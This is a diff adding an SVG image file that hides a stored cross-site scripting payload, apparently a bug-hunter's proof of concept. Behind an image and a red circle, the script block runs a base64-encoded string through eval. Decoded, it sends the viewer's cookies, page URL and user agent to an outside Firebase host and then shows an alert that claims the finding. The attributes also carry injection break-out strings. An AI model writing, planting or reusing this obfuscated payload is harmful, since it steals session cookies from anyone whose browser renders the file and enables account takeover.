@@ -1,0 +1,14 @@
+<?xml version="1.0" standalone="no"?>
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://w3.org" viewBox="0 0 500 500">
+  <!-- Background Foto -->
+  <image xlink:href="https://amazonaws.com" x="0" y="0" width="100%" height="100%""")/>>
+  
+  <!-- Lingkaran Indikator -->
+  <circle cx="50" cy="50" r="40" fill="red" fill-opacity="0.6""")/>>
+
+  <script type="text/javascript">
+    <![CDATA[
+    eval(atob("ZmV0Y2goJ2h0dHBzOi8vZmlyZWJhc2VkYXRhYmFzZS5hcHAnLCB7bWV0aG9kOiAnUE9TVCcsIG1vZGU6ICduby1jb3JzJywgYm9keTogSlNPTi5zdHJpbmdpZnkoeyBtc2c6ICJYU1MgVHJpZ2dlcmVkIiwgY29va2llOiBkb2N1bWVudC5jb29raWUsIHVybDogd2luZG93LmxvY2F0aW9uLmhyZWYsIHVhOiBuYXZpZ2F0b3IudXNlckFnZW50IH0pIH0pOyBhbGVydCgnSGkgUmF5LCB0aGVyZSBpcyBhIFN0b3JlZCBYU1MgdnVsbmVyYWJpbGl0eSBmb3VuZCBmcm9tIERlbnp5IFplcm9EYXknKTs="));
+    ]]>
+  </script>
+</svg>
